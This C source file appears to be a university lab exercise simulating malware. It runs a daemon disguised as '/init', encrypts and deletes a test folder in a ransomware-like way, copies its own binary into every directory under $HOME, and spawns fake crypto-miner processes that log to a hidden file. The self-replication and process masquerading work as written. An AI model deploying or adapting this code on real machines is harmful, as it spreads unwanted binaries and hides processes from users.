#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/prctl.h>
#include <signal.h>

#define BASE_DIR "/home/ardhana_48/malware_test"
#define GROUP_NUM 2
#define ZIP_NAME "folder_in.zip"
#define SECRET_FILE "secret.txt"
#define MAX_MINERS 5

void make_dir(const char *path) {
    mkdir(path, 0755);
}

void write_file(const char *filepath, const char *content) {
    int fd = open(filepath, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, content, strlen(content));
        close(fd);
    }
}

void xor_encrypt(const char *filepath, unsigned char key) {
    int fd = open(filepath, O_RDWR);
    if (fd < 0) return;

    char buf;
    while (read(fd, &buf, 1) == 1) {
        buf ^= key;
        lseek(fd, -1, SEEK_CUR);
        write(fd, &buf, 1);
    }
    close(fd);
}

void simulate_zip(const char *src_dir, const char *zip_path) {
    int out = open(zip_path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (out < 0) return;

    DIR *dir = opendir(src_dir);
    struct dirent *entry;
    char fullpath[512];
    char buffer[1024];
    int fd, n;

    while ((entry = readdir(dir))) {
        if (entry->d_type != DT_REG) continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", src_dir, entry->d_name);
        fd = open(fullpath, O_RDONLY);
        while ((n = read(fd, buffer, sizeof(buffer))) > 0) {
            write(out, buffer, n);
        }
        close(fd);
    }
    closedir(dir);
    close(out);
}

void remove_dir(const char *path) {
    DIR *dir = opendir(path);
    struct dirent *entry;
    char fullpath[512];

    while ((entry = readdir(dir))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
        unlink(fullpath);
    }
    closedir(dir);
    rmdir(path);
}

void spawn_daemon() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) {
        printf("[+] Daemon /init berjalan di PID %d\n", pid);
        return;
    }

    if (setsid() < 0) exit(EXIT_FAILURE);

    pid_t pid2 = fork();
    if (pid2 < 0) exit(EXIT_FAILURE);
    if (pid2 > 0) exit(EXIT_SUCCESS);

    chdir("/");
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);

    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);

    while (1) {
        sleep(60);
    }
}

void spread_trojan(const char *self_path) {
    const char *home = getenv("HOME");
    DIR *dir = opendir(home);
    struct dirent *entry;
    char target[512];
    int src_fd, dst_fd;
    char buf[1024];
    int n;

    while ((entry = readdir(dir))) {
        if (entry->d_type != DT_DIR) continue;
        if (entry->d_name[0] == '.') continue;

        snprintf(target, sizeof(target), "%s/%s/copy_malware", home, entry->d_name);
        src_fd = open(self_path, O_RDONLY);
        dst_fd = open(target, O_CREAT | O_WRONLY | O_TRUNC, 0755);
        while ((n = read(src_fd, buf, sizeof(buf))) > 0) {
            write(dst_fd, buf, n);
        }
        close(src_fd);
        close(dst_fd);
    }
    closedir(dir);
}

void generate_crypto_hash(char *hash){
    const char *hex = "0123456789abcdef";
    for(int i = 0; i < 64; i++){
        hash[i] = hex[rand() % 16];
    }
    hash[64] = '\0';
}

void rodok_forkbomb() {
    for (int i = 0; i < MAX_MINERS; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("Failed to fork.");
            continue;
        }

        if (pid == 0) {
            prctl(PR_SET_PDEATHSIG, SIGTERM);  // Anak mati jika induk mati

            char name[32];
            snprintf(name, sizeof(name), "mine-crafter-%d", i);
            if (prctl(PR_SET_NAME, name, 0, 0, 0) == -1) {
                perror("Failed to set process name.");
            }

            FILE *log = fopen("/tmp/.miner.log", "a");
            if (!log) {
                perror("Failed to open log file");
                exit(1);
            }

            while (1) {
                char hash[65];
                generate_crypto_hash(hash);

                time_t now = time(NULL);
                struct tm *t = localtime(&now);
                fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                        t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                        t->tm_hour, t->tm_min, t->tm_sec, i, hash);
                fflush(log);

                sleep((rand() % 28) + 3);
            }

            fclose(log);
            exit(0);
        }
    }
}

void run_wannacryptor() {
    printf("[!] Running wannacryptor simulation...\n");
}

void run_trojan() {
    printf("[!] Spreading trojan.wrm...\n");
}

void loop_wannacryptor_trojan() {
    pid_t pid = fork();
    if(pid < 0) {
        perror("Failed to fork.");
        exit(EXIT_FAILURE);
    }

    if(pid == 0) {
        while(1) {
            run_wannacryptor();
            run_trojan();
            sleep(30);
        }
        exit(0);
    }
}

int main(int argc, char *argv[]) {
    char target_dir[256], secret_path[256], zip_path[256];
    snprintf(target_dir, sizeof(target_dir), "%s/test/folder_in", BASE_DIR);
    snprintf(secret_path, sizeof(secret_path), "%s/%s", target_dir, SECRET_FILE);
    snprintf(zip_path, sizeof(zip_path), "%s/test/%s", BASE_DIR, ZIP_NAME);

    make_dir(BASE_DIR);
    make_dir(BASE_DIR "/test");
    make_dir(target_dir);

    write_file(secret_path, "data rahasia");
    printf("[+] Folder uji dibuat di: %s\n", target_dir);

    spawn_daemon();

    if (GROUP_NUM % 2 == 0) {
        printf("[+] Metode: ZIP (Kelompok Genap)\n");
        simulate_zip(target_dir, zip_path);

        time_t t = time(NULL);
        unsigned char key = t % 256;
        xor_encrypt(zip_path, key);
        printf("[+] Zip terenkripsi\n");

        remove_dir(target_dir);
        printf("[+] Folder asli dihapus\n");
    }

    spread_trojan(argv[0]);
    printf("[+] Trojan disebar ke direktori dalam $HOME\n");

    srand(time(NULL));

    if(argc != 3 || strcmp(argv[1], "-m") != 0) {
        fprintf(stderr, "Usage: %s -m [Loop|Rodok]\n", argv[0]);
        return EXIT_FAILURE;
    }

    if(strcmp(argv[2], "Loop") == 0) {
        loop_wannacryptor_trojan();
    } else if(strcmp(argv[2], "Rodok") == 0) {
        rodok_forkbomb();
    } else {
        fprintf(stderr, "Unknown mode: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    printf("[i] Semua proses selesai.\n");
    while(1) pause();
    return EXIT_SUCCESS;
}